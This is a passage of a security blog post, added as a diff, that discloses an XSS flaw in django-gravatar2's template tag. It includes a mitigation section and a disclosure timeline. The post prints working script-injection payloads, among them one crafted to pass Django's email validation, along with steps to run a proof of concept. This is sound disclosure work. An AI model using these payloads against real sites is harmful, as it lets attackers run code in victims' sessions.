+<li><p>Injects a script that shows an alert with the current domain.</p></li>
+<li><p>Opens a new tag so the rest of the HTML is not shown as broken.</p></li>
+</ul>
+<p>The payload injected into the template would look like this:</p>
+<div class="code"><pre class="code html"><a id="rest_code_066fa8570cd94744928867111d9a8193-1" name="rest_code_066fa8570cd94744928867111d9a8193-1" href="#rest_code_066fa8570cd94744928867111d9a8193-1"></a><span class="p">&lt;</span><span class="nt">img</span> <span class="na">class</span><span class="o">=</span><span class="s">"gravatar"</span> <span class="na">src</span><span class="o">=</span><span class="s">"https://www.gravatar.com/"</span> <span class="na">width</span><span class="o">=</span><span class="s">"50"</span> <span class="na">height</span><span class="o">=</span><span class="s">"50"</span> <span class="na">alt</span><span class="o">=</span><span class="s">""</span><span class="p">/&gt;</span>
+<a id="rest_code_066fa8570cd94744928867111d9a8193-2" name="rest_code_066fa8570cd94744928867111d9a8193-2" href="#rest_code_066fa8570cd94744928867111d9a8193-2"></a><span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span><span class="nx">alert</span><span class="p">(</span><span class="nb">document</span><span class="p">.</span><span class="nx">domain</span><span class="p">)&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+<a id="rest_code_066fa8570cd94744928867111d9a8193-3" name="rest_code_066fa8570cd94744928867111d9a8193-3" href="#rest_code_066fa8570cd94744928867111d9a8193-3"></a><span class="p">&lt;</span><span class="nt">img</span> <span class="na">src</span><span class="o">=</span><span class="s">""</span> <span class="p">/&gt;</span>
+</pre></div>
+<p>But that's very similar to the previous example,
+so let's assume that the application uses the user's email as the alt text instead.</p>
+<div class="code"><pre class="code html"><a id="rest_code_3c124332878b4cf6a88a7ba41fa75a67-1" name="rest_code_3c124332878b4cf6a88a7ba41fa75a67-1" href="#rest_code_3c124332878b4cf6a88a7ba41fa75a67-1"></a>{% load gravatar from gravatar %}
+<a id="rest_code_3c124332878b4cf6a88a7ba41fa75a67-2" name="rest_code_3c124332878b4cf6a88a7ba41fa75a67-2" href="#rest_code_3c124332878b4cf6a88a7ba41fa75a67-2"></a>
+<a id="rest_code_3c124332878b4cf6a88a7ba41fa75a67-3" name="rest_code_3c124332878b4cf6a88a7ba41fa75a67-3" href="#rest_code_3c124332878b4cf6a88a7ba41fa75a67-3"></a>{% gravatar user 50 user.email %}
+</pre></div>
+<p>You may think that's the same as the previous example,
+but now the payload needs to be a valid email.
+And if you try to create an email with the previous payload, it won't work,
+as the Django user model will validate the email format.</p>
+<p>Making the payload a valid email is not as simple as just adding <code class="docutils literal">@example.com</code> at the end,
+as the part before the <code class="docutils literal">@</code> (local part) can't contain special characters like <code class="docutils literal"><span class="pre">"&lt;&gt;()</span></code>,
+which are part of the payload.</p>
+<p>Luckily, the <a class="reference external" href="https://en.wikipedia.org/wiki/Email_address#Local-part">spec says that the local part can contain any ASCII characters if it's quoted</a>,
+and coincidentally, our payload has already quotes around it, so it's just a matter adding <code class="docutils literal">@example.com</code> at the end!
+Or almost... Django's email validator does allow the local part to be quoted, but it doesn't allow spaces,
+luckily HTML is very forgiving, so we can add almost anything instead of the spaces, and our payload will still work</p>
+<div class="code"><pre class="code html"><a id="rest_code_4846fd7b920c40dfaa755b6acb842fa8-1" name="rest_code_4846fd7b920c40dfaa755b6acb842fa8-1" href="#rest_code_4846fd7b920c40dfaa755b6acb842fa8-1"></a>"/&gt;<span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span><span class="nx">alert</span><span class="p">(</span><span class="nb">document</span><span class="p">.</span><span class="nx">domain</span><span class="p">)&lt;/</span><span class="nt">script</span><span class="p">&gt;&lt;</span><span class="nt">img</span><span class="err">/</span><span class="na">src</span><span class="o">=</span><span class="s">"@example.com</span>
+</pre></div>
+<p>You could also leave the tag unclosed, but that will break the rest of the HTML in the template.</p>
+<div class="code"><pre class="code html"><a id="rest_code_d1ebd8d6fe034f6e9c194a40535bbd07-1" name="rest_code_d1ebd8d6fe034f6e9c194a40535bbd07-1" href="#rest_code_d1ebd8d6fe034f6e9c194a40535bbd07-1"></a>"/&gt;<span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span><span class="nx">alert</span><span class="p">(</span><span class="nb">document</span><span class="p">.</span><span class="nx">domain</span><span class="p">)&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>"@example.com
+</pre></div>
+</section><section id="proof-of-concept-1"><h3>Proof of concept</h3>
+<p>I created a <a class="reference external" href="https://github.com/stsewd/poc-xss-django-gravatar2">proof of concept</a> to demonstrate the vulnerability, so you can see it in action,
+you just need to have Python and <a class="reference external" href="https://docs.astral.sh/uv/getting-started/installation/">uv</a> installed:</p>
+<p>It consists of a simple Django project with <code class="docutils literal"><span class="pre">django-gravatar2==1.4.4</span></code> installed,
+it shows the Gravatar of a user given its email.</p>
+<div class="code"><pre class="code bash"><a id="rest_code_7d87ded5988343ceb7fd95cb05189ed2-1" name="rest_code_7d87ded5988343ceb7fd95cb05189ed2-1" href="#rest_code_7d87ded5988343ceb7fd95cb05189ed2-1"></a>$<span class="w"> </span>git<span class="w"> </span>clone<span class="w"> </span>https://github.com/stsewd/poc-xss-django-gravatar2
+<a id="rest_code_7d87ded5988343ceb7fd95cb05189ed2-2" name="rest_code_7d87ded5988343ceb7fd95cb05189ed2-2" href="#rest_code_7d87ded5988343ceb7fd95cb05189ed2-2"></a>$<span class="w"> </span><span class="nb">cd</span><span class="w"> </span>poc-xss-django-gravatar2
+<a id="rest_code_7d87ded5988343ceb7fd95cb05189ed2-3" name="rest_code_7d87ded5988343ceb7fd95cb05189ed2-3" href="#rest_code_7d87ded5988343ceb7fd95cb05189ed2-3"></a>$<span class="w"> </span>uv<span class="w"> </span>run<span class="w"> </span>manage.py<span class="w"> </span>migrate
+<a id="rest_code_7d87ded5988343ceb7fd95cb05189ed2-4" name="rest_code_7d87ded5988343ceb7fd95cb05189ed2-4" href="#rest_code_7d87ded5988343ceb7fd95cb05189ed2-4"></a>$<span class="w"> </span>uv<span class="w"> </span>run<span class="w"> </span>manage.py<span class="w"> </span>runserver
+</pre></div>
+<ul class="simple">
+<li><p>Go to <code class="docutils literal"><span class="pre">http://127.0.0.1:8000/</span></code></p></li>
+<li><p>In the form enter <code class="docutils literal"><span class="pre">"/&gt;&lt;script&gt;alert(document.domain)&lt;/script&gt;&lt;img</span> src="</code> as the name,
+or <code class="docutils literal"><span class="pre">"/&gt;&lt;script&gt;alert(document.domain)&lt;/script&gt;&lt;img/src="@example.com</span></code> as the email.</p></li>
+<li><p>Click on the "Submit" button.</p></li>
+<li><p>A pop-up with the domain of the page should appear.</p></li>
+</ul>
+<p>Showing an alert is just a simple example,
+but an attacker can execute any JavaScript code in the context of the user's session.</p>
+</section><section id="mitigation-1"><h3>Mitigation</h3>
+<p>As the previous vulnerability,
+you should never use <code class="docutils literal">mark_safe</code> with user-controlled content,
+if you need to build HTML with user-controlled data outside of a template,
+you can use the <a class="reference external" href="https://docs.djangoproject.com/en/4.2/ref/utils/#django.utils.html.format_html">format_html</a> function.</p>
+<aside class="admonition note"><p class="admonition-title">Note</p>
+<p>The maintainer chose to <a class="reference external" href="https://github.com/twaddington/django-gravatar/commit/b08820112f062b40521c6f07fb9657f4204f6cf1">escape the alt text only</a>,
+as he considered the size and CSS class should be validated by the developer.
+If you are using the <code class="docutils literal">gravatar</code> template tag with user-controlled content
+in the size or CSS class, you should escape it as show in the following example:</p>
+<div class="code"><pre class="code html"><a id="rest_code_c069e7dff062423d822a15c1a018c59c-1" name="rest_code_c069e7dff062423d822a15c1a018c59c-1" href="#rest_code_c069e7dff062423d822a15c1a018c59c-1"></a>{% gravatar user size|escape "User profile" class|escape %}
+</pre></div>
+</aside></section><section id="timeline-1"><h3>Timeline</h3>
+<ul class="simple">
+<li><p><strong>21/06/2024</strong>: Found and reported the vulnerability to the maintainer.</p></li>
+<li><p><strong>21/06/2024</strong>: Maintainer replied and confirmed the vulnerability.</p></li>
+<li><p><strong>29/08/2024</strong>: Maintainer released version 1.4.5 with the fix.</p></li>
+</ul></section></section><section id="more-in-common-than-you-think"><h2>More in common than you think</h2>
+<p>Apart from sharing the same vulnerability, there are other similarities between the two packages:</p>
+<ul class="simple">
+<li><p>Widely used packages.
+At the time of writing, <a class="reference external" href="https://pypistats.org/packages/django-impersonate">django-impersonate had 220K downloads in the last month</a>,
+and <a class="reference external" href="https://pypistats.org/packages/django-gravatar2">django-gravatar2 had 32K downloads in the last month</a>.</p></li>
+<li><p>Mostly maintained by a single person.</p></li>
+<li><p>Not actively maintained.</p></li>
+</ul>
+<p>While the functionality that both packages provide is very specific,
+they may be considered complete and stable without the need for active development.
+But as with any software, there is always room for improvement,
+or updates to keep up with the latest versions of Python and Django.</p>
+<p>If you or your company use these packages,
+please consider contributing to them in any way you can.
+Another thing these packages have in common is that they are looking for maintainers,
+so if you have the time and knowledge, consider helping them.</p>
+</section><section id="acknowledgements"><h2>Acknowledgements</h2>
+<ul class="simple">
+<li><p>Thanks to <a class="reference external" href="https://petersanchez.com/">Peter Sanchez</a> (maintainer of django-impersonate),
+and <a class="reference external" href="https://github.com/twaddington">Tristan Waddington</a> (maintainer of django-gravatar2)
+for their quick responses and fixes.</p></li>
+<li><p>It's also great I have the support at Read the Docs to spend part of my work time on security audits on packages we use.
+Even if the vulnerabilities don't affect our systems directly,
+it's nice to have the chance to give back to the community.</p></li>
+</ul></section>
+</div>
+    <aside class="postpromonav"><nav><ul itemprop="keywords" class="tags">
+<li><a class="tag p-category" href="../../categories/django/" rel="tag">django</a></li>
+            <li><a class="tag p-category" href="../../categories/python/" rel="tag">python</a></li>
+            <li><a class="tag p-category" href="../../categories/security/" rel="tag">security</a></li>
+            <li><a class="tag p-category" href="../../categories/xss/" rel="tag">xss</a></li>
+        </ul>
+<ul class="pager hidden-print">
+<li class="previous">
+                <a href="../xss-in-django-allauth-fb-provider/" rel="prev" title="XSS in django-allauth 0.63.5">Previous post</a>
+            </li>
+        </ul></nav></aside><section class="comments hidden-print"><h2>Comments</h2>
+        
+    
+        <div id="disqus_thread"></div>
+        <script>
+        var disqus_shortname ="stsewd",
+            disqus_url="https://stsewd.dev/posts/xss-in-djang-impersonate-and-django-gravatar2/",
+        disqus_title="XSS in django-impersonate 1.9.3 and django-gravatar2 1.4.4",
+        disqus_identifier="cache/posts/xss-in-djang-impersonate-and-django-gravatar2.html",
+        disqus_config = function () {
+            this.language = "en";
+        };
+        (function() {
+            var dsq = document.createElement('script'); dsq.async = true;
+            dsq.src = 'https://' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        })();
+    </script><noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript" rel="nofollow">comments powered by Disqus.</a>
+</noscript>
+    <a href="https://disqus.com" class="dsq-brlink" rel="nofollow">Comments powered by <span class="logo-disqus">Disqus</span></a>
+
+
+        </section></article><script>var disqus_shortname="stsewd";(function(){var a=document.createElement("script");a.async=true;a.src="https://"+disqus_shortname+".disqus.com/count.js";(document.getElementsByTagName("head")[0]||document.getElementsByTagName("body")[0]).appendChild(a)}());</script>
+</div>
+  </div>
+</div>
+
+  <script src="https://craig.global.ssl.fastly.net/js/mousetrap/mousetrap.min.js"></script><script src="../../assets/js/keybindings.js"></script><script src="https://cdnjs.cloudflare.com/ajax/libs/anchor-js/4.1.0/anchor.min.js"></script><script>
+  anchors.add();
+</script><!--End of body content--><footer id="footer"><div class="container">
+    <div class="row text-center">
+        <div class="col">
+            <small>
+                Contents © 2025 <a href="mailto:stsewd@proton.me">Santos Gallegos</a> -
+                Powered by <a href="https://getnikola.com" rel="nofollow">Nikola</a> -
+                Hosted on <a href="https://pages.github.com/" rel="nofollow">GitHub Pages</a>
+                
+            </small>
+        </div>
+    </div>
+    <div class="row text-center">
+        <div class="col">
+            <small>
+                <a href="http://github.com/stsewd">
+                <i class="fa fa-github fa-2x"></i>
+                </a>
+                <a href="http://twitter.com/stsewd">
+                <i class="fa fa-twitter fa-2x"></i>
+                </a>
+            </small>
+        </div>
+    </div>
+</div>
+
+            
+            
+        </footer>
+</div>
+</div>
+
+
+        <script src="../../assets/js/all-nocdn.js"></script><script>
+    baguetteBox.run('div#content', {
+        ignoreClass: 'islink',
+        captions: function(element){var i=element.getElementsByTagName('img')[0];return i===undefined?'':i.alt;}});
+    </script>
+</body>
+</html>
